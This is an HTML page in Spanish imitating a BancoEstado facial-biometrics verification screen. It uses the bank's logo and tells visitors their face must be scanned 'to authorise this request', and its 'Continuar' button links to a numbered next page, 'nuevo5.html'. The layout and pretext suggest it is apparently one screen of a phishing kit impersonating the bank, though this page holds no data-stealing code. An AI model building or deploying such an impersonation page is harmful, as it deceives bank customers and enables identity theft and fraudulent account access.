<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BancoEstado - Biometría Facial</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');

        body {
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, sans-serif;
            background-color: #f8f9fb;
            display: flex;
            justify-content: center;
            color: #334155;
        }

        .main-container {
            width: 100%;
            max-width: 420px;
            background-color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            box-shadow: 0 10px 25px rgba(0,0,0,0.03);
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
        }

        .logo {
            height: 28px;
            opacity: 0.9;
        }

        .close-btn {
            width: 32px;
            height: 32px;
            background-color: #f1f5f9;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #64748b;
            font-size: 18px;
            cursor: pointer;
        }

        .content {
            padding: 40px 30px;
            text-align: center;
            flex-grow: 1;
        }

        .bio-icon {
            width: 140px;
            height: auto;
            margin-bottom: 30px;
        }

        h1 {
            font-size: 20px;
            font-weight: 700;
            color: #1e293b;
            line-height: 1.3;
            margin-bottom: 20px;
        }

        p {
            font-size: 15px;
            color: #64748b;
            line-height: 1.6;
            margin-bottom: 40px;
        }

        .footer-action {
            padding: 20px 30px 40px;
        }

        .btn-continuar {
            background-color: #ff8c00;
            color: white;
            border: none;
            padding: 18px;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(255, 140, 0, 0.2);
            transition: all 0.2s;
        }

        .btn-continuar:active {
            transform: scale(0.97);
        }

        .secure-tag {
            margin-top: 20px;
            font-size: 11px;
            color: #94a3b8;
            text-transform: uppercase;
            letter-spacing: 1px;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 5px;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b3/Logo_BancoEstado.svg/1280px-Logo_BancoEstado.svg.png" alt="Logo BancoEstado" class="logo">
            <div class="close-btn">✕</div>
        </div>

        <div class="content">
            <svg class="bio-icon" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="35" y="10" width="50" height="100" rx="8" stroke="#cbd5e1" stroke-width="2"/>
                <circle cx="60" cy="55" r="25" stroke="#22c55e" stroke-width="3" stroke-dasharray="4 2"/>
                <path d="M50 50C50 44.4772 54.4772 40 60 40C65.5228 40 70 44.4772 70 50V55C70 60.5228 65.5228 65 60 65C54.4772 65 50 60.5228 50 55V50Z" fill="#e2e8f0"/>
                <path d="M40 95C40 85 50 80 60 80C70 80 80 85 80 95" stroke="#cbd5e1" stroke-width="2" stroke-linecap="round"/>
            </svg>

            <h1>Necesitamos validar tu identidad a través de Biometría Facial</h1>
            
            <p>Sitúa tu rostro en el recuadro que verás a continuación para autorizar esta solicitud.</p>
        </div>

        <div class="footer-action">
            <button class="btn-continuar" onclick="window.location.href='nuevo5.html'">Continuar</button>
            
            <div class="secure-tag">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                Validación de Identidad Segura
            </div>
        </div>
    </div>

</body>
</html>
